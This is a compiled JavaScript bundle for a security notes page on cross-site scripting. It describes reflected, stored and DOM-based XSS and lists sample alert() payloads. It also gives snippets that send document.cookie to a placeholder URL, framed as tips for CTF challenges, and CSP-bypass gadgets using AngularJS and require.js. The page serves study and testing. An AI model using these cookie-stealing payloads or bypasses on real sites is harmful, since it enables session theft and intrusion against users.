"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[2587],{85411:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>o,default:()=>h,frontMatter:()=>r,metadata:()=>a,toc:()=>l});var i=n(74848),t=n(28453);const r={},o="\ud83d\udcac XSS",a={id:"security/web/xss",title:"\ud83d\udcac XSS",description:"Cross Site Scripting (XSS) is a type of attack in which malicious scripts are injected in a website and executed on the client browser.",source:"@site/docs/security/05-web/xss.md",sourceDirName:"security/05-web",slug:"/security/web/xss",permalink:"/docs/security/web/xss",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/xss.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udd28 SSRF",permalink:"/docs/security/web/ssrf"},next:{title:"\u2709\ufe0f XXE",permalink:"/docs/security/web/xxe"}},c={},l=[{value:"Types of XSS",id:"types-of-xss",level:2},{value:"Reflected",id:"reflected",level:3},{value:"Stored",id:"stored",level:3},{value:"DOM-based",id:"dom-based",level:3},{value:"Send requests in Javascript",id:"send-requests-in-javascript",level:2},{value:"CSP bypasses",id:"csp-bypasses",level:2},{value:"JSONP endpoints",id:"jsonp-endpoints",level:3},{value:"require.js",id:"requirejs",level:3}];function d(e){const s={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.h1,{id:"-xss",children:"\ud83d\udcac XSS"}),"\n",(0,i.jsx)(s.p,{children:"Cross Site Scripting (XSS) is a type of attack in which malicious scripts are injected in a website and executed on the client browser."}),"\n",(0,i.jsx)(s.p,{children:"Common payloads to check for XSS are:"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-xml",children:"<script>alert('hello');<\/script>\n\n<img src=\"javascript:alert('hello')\">\n\n<iframe src=\"javascript:alert(`xss`)\"></iframe>\n\n<svg onload=\"alert('xss')\">\n\n<img onerror=\"alert('hello')\">\n"})}),"\n",(0,i.jsx)(s.p,{children:"Possible goals of a XSS:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Steal the user cookie"}),"\n",(0,i.jsx)(s.li,{children:"Log user activities on the website"}),"\n",(0,i.jsx)(s.li,{children:"Change client code execution"}),"\n",(0,i.jsx)(s.li,{children:"Make some actions from the admin account"}),"\n"]}),"\n",(0,i.jsx)(s.h2,{id:"types-of-xss",children:"Types of XSS"}),"\n",(0,i.jsx)(s.p,{children:"There are three main types of XSS:"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"reflected"}),"\n",(0,i.jsx)(s.li,{children:"stored"}),"\n",(0,i.jsx)(s.li,{children:"DOM-based"}),"\n"]}),"\n",(0,i.jsx)(s.h3,{id:"reflected",children:"Reflected"}),"\n",(0,i.jsx)(s.p,{children:"In reflected XSS the data inserted by the user is included in the webpage source without any validation."}),"\n",(0,i.jsx)(s.p,{children:"Common point of attacks are query or path params."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{children:"http://website.com/profile?greetings=<script>alert('Hi!')<\/script>\n"})}),"\n",(0,i.jsx)(s.h3,{id:"stored",children:"Stored"}),"\n",(0,i.jsx)(s.p,{children:"In stored XSS the payload is stored on the server and it is executed when other users visit the page."}),"\n",(0,i.jsx)(s.p,{children:"It was very common in the past inside public forum or blogs. The payload can be stored inside a comment or a post."}),"\n",(0,i.jsx)(s.p,{children:"Other examples are user profile information or contact forms."}),"\n",(0,i.jsxs)(s.p,{children:["Do you know someone called ",(0,i.jsx)(s.code,{children:"<script>alert('Hi!')<\/script>"}),"?"]}),"\n",(0,i.jsx)(s.p,{children:"When there is no way to test your payload, this type of vulnerability becomes a blind XSS."}),"\n",(0,i.jsx)(s.p,{children:"For example, you could be able to exploit a XSS by writing something to the admin without seeing the result of it."}),"\n",(0,i.jsx)(s.h3,{id:"dom-based",children:"DOM-based"}),"\n",(0,i.jsx)(s.p,{children:"In DOM-based XSS the execution happens in the browser without any refreshes or updates."}),"\n",(0,i.jsx)(s.p,{children:"Common examples are input form or special page actions."}),"\n",(0,i.jsx)(s.h2,{id:"send-requests-in-javascript",children:"Send requests in Javascript"}),"\n",(0,i.jsx)(s.p,{children:"XSS challenges usually require to do a request with a secret value.\nThese snippets below are possible ways to do it."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-js",children:"// this is a redirection, but it could be used too\ndocument.location = '<url>?cookie=' + document.cookie\n"})}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-js",children:"var request = new XMLHttpRequest()\nrequest.open('GET', '<url>?cookie=' + document.cookie)\nrequest.send(null)\n"})}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-js",children:"fetch('<url>?cookie=' + document.cookie)\n"})}),"\n",(0,i.jsx)(s.h2,{id:"csp-bypasses",children:"CSP bypasses"}),"\n",(0,i.jsx)(s.h3,{id:"jsonp-endpoints",children:"JSONP endpoints"}),"\n",(0,i.jsx)(s.p,{children:"This technique is based on special JSONP endpoints that allows unsafe execution of malicious scripts."}),"\n",(0,i.jsxs)(s.p,{children:["Look ",(0,i.jsx)(s.a,{href:"https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt",children:"here"})," for a list of the most common endpoints."]}),"\n",(0,i.jsx)(s.admonition,{type:"caution",children:(0,i.jsx)(s.p,{children:"If there are any CSP sources set, you should pay attention on which endpoint you are using."})}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-html",children:"<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js><\/script>\n<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>\n"})}),"\n",(0,i.jsx)(s.h3,{id:"requirejs",children:"require.js"}),"\n",(0,i.jsx)(s.p,{children:"If the website uses require.js, it is possible to load additional code that will be automatically injected.\nThis means that the code will be loaded together with require.js and so it will avoid any nonce or other CSP."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-js",children:'<script data-main="data:1,alert(1)" src="require.js"><\/script>\n'})})]})}function h(e={}){const{wrapper:s}={...(0,t.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},28453:(e,s,n)=>{n.d(s,{R:()=>o,x:()=>a});var i=n(96540);const t={},r=i.createContext(t);function o(e){const s=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),i.createElement(r.Provider,{value:s},e.children)}}}]);